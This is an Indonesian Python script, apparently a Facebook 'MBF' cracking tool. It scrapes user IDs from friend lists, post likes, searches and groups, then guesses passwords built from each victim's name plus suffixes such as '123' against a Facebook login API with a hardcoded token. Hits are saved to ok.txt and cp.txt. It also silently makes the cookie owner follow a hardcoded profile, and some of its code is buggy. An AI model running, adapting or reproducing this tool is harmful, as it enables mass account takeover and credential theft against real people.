#!/usr/bin/python
# -*- coding: utf-8 
# coding by Milzu TC 
#Created 1-8-2021
#fb = MÎŁŽÛ ŤČ
#JANGAN DI RECODE YA NGENTOD

import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor

def mulai():
    os.system("git pull")
def lupo_lupo_milzu():
    os.system("clear")
def aink():
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def menu():
    os.system("clear")
    a=requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    try:
        sc = a["status"]
    except KeyError:
        sc = " "
    try:
        ng = a["country"]
    except KeyError:
        ng = " "
    try:
        rg = a["region"]
    except KeyError:
        rg = " "
    try:
        pr = a["regionName"]
    except KeyError:
        pr = " "
    try:
        kt = a["city"]
    except KeyError:
        kt = " "
    try:
        tz = a["timezone"]
    except KeyError:
        tz = " "
    try:
        om = a["offset"]
    except KeyError:
        om = " "
    try:
        mt = a["currency"]
    except KeyError:
        mt = " "
    try:
        sp = a["isp"]
    except KeyError:
        sp = " "
    print("\033[93m[▪]IP ANDA\033[96m= " + ip)
    print("\033[93m[▪]Status \033[96m= " + sc)
    print("\033[93m[▪]Negara \033[96m= " + ng)
    print("\033[93m[▪]Asal \033[96m= " + rg)
    print("\033[93m[▪]Provinsi \033[96m= " + pr)
    print("\033[92m[▪]Kota \033[96m= " + kt)
    print("\033[92m[▪]Zona Waktu \033[96m= " + tz)
    print("\033[92m[▪]omzet \033[96m= " + om)
    print("\033[92m[▪]mata uang \033[96m= IDR")
    print("\033[94m[▪]Kartu Yang Anda Gunakan \033[96m= " + sp)
def peak():
    time.sleep(0.1)
    print("""
\033[94m────────────────────────────────────────────────
\033[94m────────────────────────────────────────────────
\033[35m  \033[93m__________________
\033[35m» \033[92m|      ▂\033[92m╲╱\033[92m▂      | 
\033[35m» \033[91m|      \033[00m▇▏▕▇      \033[93m|
\033[35m» \033[92m|       \033[93m||\033[92m       |
\033[35m» \033[93m|  \033[91m/><>\033[92m\\\//\033[91m<><\  \033[91m|
\033[35m» \033[92m|  \033[92m/\033[91m>\033[92m/__\033[93m\/\033[92m__\\\033[91m<\033[92m\  |
\033[35m» \033[91m|\033[92m_\033[93m_\033[91m_\033[92m_\033[93m_\033[91m| \033[92m|| \033[93m|\033[91m_\033[92m_\033[93m_\033[91m_\033[92m_\033[93m| \033[91m*V.20
\033[94m────────────────────────────────────────────────
\033[92m•\033[91m_\033[93mMBF\033[91m_
\033[92m•\033[93mSubscribe\033[91m:\033[92mMILZU-TC TUTORIAL77
\033[94m────────────────────────────────────────────────
\033[93m•Tahun Pembuatan server:2021
\033[94m────────────────────────────────────────────────
\033[92m[\033[91m+\033[92m]\033[92mxAuthor  \033[91m: \033[92mMilzu TC
\033[93m[\033[92m+\033[93m]\033[93mInstagram\033[91m: \033[93m-
\033[91m[\033[93m+\033[91m]\033[93mFacebook \033[91m: \033[96mfacebook.com/Mîłžû Ťč
\033[94m──────────────────────────────────────────────── """)

def milzutc():
    milzu=input("\n\033[00m\t   [\033[96m Tekan enter untuk kembali\033[97m ] ")
    if milzu == "": 
       os.system("python MBF.V2.py")
    else:
       sys.exit("\n\033[1;97m [\033[1;91m♡\033[1;97m] \033[1;91mTerima kasih :')")
def mbfv2():
    time.sleep(0.1)
    print(" \x1b[00m──────────────────────────────────────────────")
    print(" \033[90m[\033[96m?\033[90m] \033[92m01\033[97m.\033[96mMÂŠÛĶ ")
    print(" \033[90m[\033[96m?\033[90m] \033[92m02\033[97m.\033[96mČÂŘÂ MÊŇĎÂPÂŤĶÂŇ ČÔĶÎÊ ")
    print(" \033[90m[\033[96m?\033[90m] \033[92m03\033[97m.\033[96mMÂŠÛĶ ĞŘÛP FB 《COMUNITY》OF THE HACKER♡")
    print(" \033[90m[\033[96m?\033[90m] \033[92m04\033[97m.\033[96mMÂŠÛĶ ĞŘÛP WHÂŤŠÂPP ")
    print(" \033[90m[\033[96m?\033[90m] \033[92m05\033[97m.\033[96mÛPĞŘÂĎÊ ŠÊŘVÊŘ ")
    print(" \033[90m[\033[93m!\033[90m] \033[91m00\033[97m.\033[96mĶÊŁÛÂŘ ")
    print(" \x1b[00m──────────────────────────────────────────────")
    time.sleep(0.1)

    milzu=input("\n\033[90m╰>[>_<]👉 \033[1;93m")
    if milzu== "1" or milzu =="01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         hack = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                   lupo_lupo_milzu()
                   menu()
                   peak()
                   cek = input("\n\033[0;92m       [ \033[92mServer ini menggunakan Cokiee \033[0;92m]\n\n\033[90m [\033[91m>_<\033[90m] \033[96mCokiee \033[1;91m~> \033[1;96m")
                   print('\n\033[97m [\033[92m*\033[97m] \033[92mHarap bersabar...')
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;97m[\033[1;94m+\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/100071637038126"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"]
                     aink('\033[1;97m[\033[1;94m+\033[1;97m] \033[1;92mLogin berhasil🖒...')
             else:
                  os.system("xdg-open https://youtu.be/QF0jMxC6CkE") 
                  os.system('rm -rf cookies')
                  print(" \n \033[96m[\033[91m!!\x1b[1;96m] Cookie Salah")
                  os.system('python MBF.V2.py')
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             nama = a["name"]
             if 'EAA' in response.text:
                 print(f"\r\033[1;92m  * 👉 {username}[▪]{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"[▪]"+password)
                 else:
                        with open('ok.txt','a') as f:
                                f.write(username + '[▪]' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[1;93m  * 👉 {username}[▪]{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"[▪]"+password)
                   else:
                           with open('cp.txt','a') as f:
                                f.write(username + '[▪]' + password + '\n')
             else:
                   die += 1
             for i in list('□■□'):
                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] \033[91mProses : \033[90m[\033[1;94m{str(die)}\033[90m] \033[93mcheckpoint \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[96mNow \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProcess Of Retrieving ID... ",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit(" \033[1;97m [\033[1;94m•\033[1;97m] Link Not Found!")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   lupo_lupo_milzu()
                   menu()
                   peak()
                   aink('\033[92m *PILIH METODE CRACK')
                   aink('\033[90m[\033[96m?\033[90m] \033[92m01\033[97m.\033[96mŘÔĶÊĎ ĎÂFŤÂŘ ŤÊMÂŇ')
                   aink('\033[90m[\033[96m?\033[90m] \033[92m02\033[97m.\033[96mŘÔĶÊĎ ĎÂŘÎ ŁÎĶÊ PÔŠŠŤÎŇĞÂŇ')
                   aink('\033[90m[\033[96m?\033[90m] \033[92m03\033[97m.\033[96mŘÔĶÊĎ ĎÂŘÎ PÊÑČÂŘÎÂŇ ŇÂMÂ')
                   aink('\033[90m[\033[96m?\033[90m] \033[92m04\033[97m.\033[96mŘÔĶÊĎ ĎÂŘÎ ĞŘÔÛP')
                   aink('\033[90m[\033[96m?\033[90m] \033[92m05\033[97m.\033[96mŘÔĶÊĎ ĎÂŘÎ PÛBŁÎĶ')
                   aink('\033[90m[\033[96m?\033[90m] \033[92m06\033[97m.\033[96mŁÎHÂŤ HÂŠÎŁ ŘÔĶÊĎ')
                   aink('\033[90m[\033[96m?\033[90m] \033[92m07\033[97m.\033[96mHÂPÛŠ ČÔÔĶÎÊ')
                   aink('\033[90m[\033[93m!\033[90m] \033[91m00\033[97m.\033[96mĶÊŁÛÂŘ')
                   print('\x1b[1;94m────────────────────────────────────────────────────')
                   kentang = input('\033[00m─》 \033[00m: \033[93m ')
                   if kentang =="":
                         print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                         milzu()
                   elif kentang == '0' or kentang =='00':
                         aink("\n\033[1;92m Terima kasih sudah menggunakan server.\n  Dan kamu harus bantu subscribe chanel youtube saya...\n\n")
                         os.system('xdgu-open  https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ')
                         exit()                   	
                   elif kentang == '7' or kentang =='07':
                         print("\n\x1b[1;97m [\x1b[1;96m*\x1b[1;97m] \x1b[1;96mHarap bersabar... ")
                         aink("\x1b[1;92m ▪ 10")
                         aink("\x1b[1;93m ▪▪ 20")
                         aink("\x1b[1;94m ▪▪▪ 30")
                         aink("\x1b[1;95m ▪▪▪▪ 40")
                         aink("\x1b[1;96m ▪▪▪▪▪ 50")
                         aink("\x1b[1;97m ▪▪▪▪▪▪ 60")
                         aink("\x1b[1;92m ▪▪▪▪▪▪▪ 70")
                         aink("\x1b[1;91m ▪▪▪▪▪▪▪▪ 80")
                         aink("\x1b[1;96m ▪▪▪▪▪▪▪▪▪ 90")
                         aink("\x1b[1;94m ▪▪▪▪▪▪▪▪▪▪ 100%")
                         os.system("rm -rf cookies")
                         print("\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]\x1b[1;93m Menghapus Cokiee Selesai!")
                         milzutc()
                   elif kentang == '1' or kentang =='01':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif kentang == '2' or kentang =='02':
                         username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] \033[93mMasukin Link post \033[1;91m: \033[1;93m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] \033[91mLink post tidak ditemukan!")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'www.facebook' in username:
                                 username = username.replace('m.facebook','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif kentang == '3' or kentang =='03':
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] \033[93m Cari berdasarkan nama pengguna \033[1;91m: \033[1;92m")
                         print('\033[91m[\033[93m~\033[91m] \033[92mHarap bersabar Nama Pengguna sedang dicari...')
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[90m] \033[91mNama Pengguna tidak ditemukan!")
                   elif kentang == '4' or kentang =='04':
                         print("\033[1;97m\n [\033[1;94m▪▪\033[1;97m] Harap di isi \033[91m100 \033[00mID Grup ")
                         grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[93mMasukin ID Grup \033[1;91m: \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[92m[\033[91m!\033[92m] \033[91mGRUP ID TIDAK DITEMUKAN!")
                   elif kentang == '5' or kentang =='05':
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] \033[92mUSERNAME/ID PUBLIK\033[1;91m: \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[93m[\033[91m!\033[93m] \033[91mPENGGUNA TIDAK DITEMUKAN!")
                   elif kentang == '6' or kentang =='06':
                         try:
                                 file1 = open("cp.txt").read()
                                 file2 = open("ok.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] Account To Check ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 for x in result:
                                         with open('ok.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('cp.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Selesai...")
                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Di Save Di \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                         except FileNotFoundError:
                                 exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                   else:
                         print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
                         milzu()
                   print()
                   lupo_lupo_milzu()
                   menu()
                   peak()
                   print('\033[97m\033[92mJUMLAH ID FB\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m \n",end="")       
                   expass = input("\n\033[1;93m [\033[1;96m?\033[1;93m] + Password1 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;92m [\033[1;96m?\033[1;92m] + Password2 \033[1;91m: \033[1;92m")
                   aink('\x1b[1;94m────────────────────────────────────────────────────\n')
                   lupo_lupo_milzu()
                   menu()
                   peak()
                   print('\033[96mSemua ID\x1b[1;91m :\033[94m ' + str(len(id)) + "\n\033[92m \n",end="")
                   print('\n\033[93m [\033[1;92m+\033[93m] \033[96mhasil\033[92m Now\033[93m disimpan di \033[91m: \033[92mNow.txt\n \033[92m[\033[93m-\033[92m] \033[96mhasil\x1b[1;93m Checkpoint\033[92m disimpan di \033[91m: \033[92mcp.txt')
                   print('\n [\x1b[1;91m▪\x1b[1;97m] \033[92mMatikan data seluler untuk menjeda proses crack')
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123',
                                                  str(x) + '1234',
                                                  str(x) + '12345',
                                                  str(x) + '0987',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;92m  *\033[92m Selesai...")
     
                   else:
                           print("\n\n\x1b[1;96m  *\033[91m kamu tidak memiliki hasil apapun:(")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] Putus Koneksi")

    elif milzu == "2" or milzu =="02":
         os.system("xdg-open https://youtu.be/QF0jMxC6CkE")
         milzutc()
    elif milzu == "3" or milzu =="03":
         os.system('xdg-open https://www.facebook.com/groups/338110617616908')
         milzutc()
    elif milzu == "4" or milzu =="04":
         os.system('xdg-open https://chat.whatsapp.com/EEl2Erzh6jkEahbYE3QMu2')
         milzutc()
    elif milzu == "5" or milzu =="05":
         print("\n\n\x1b[1;97m      [ \x1b[1;92m[▪] Tunggu sebentar... \x1b[1;97m ]\n")
         print("\033[93m [~] PROSES SEDANG BERJALAN ")
         os.system("git pull")
         print("\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m Sudah di update.!!\n ")
         milzutc()
    elif milzu == "0" or milzu =="00":
         aink("\n\033[1;92m Terima kasih sudah menggunakan tools ini.\n  Dan jangan lupa subscribe chanel youtube saya\n\n")
         os.system("xdg-open https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ")
         aink("\033[93m [▪] BYE...")
         exit()

if __name__=="__main__":
     lupo_lupo_milzu()
     mulai()
     lupo_lupo_milzu()
     menu()
     peak()
     mbfv2()
     milzutc()
         
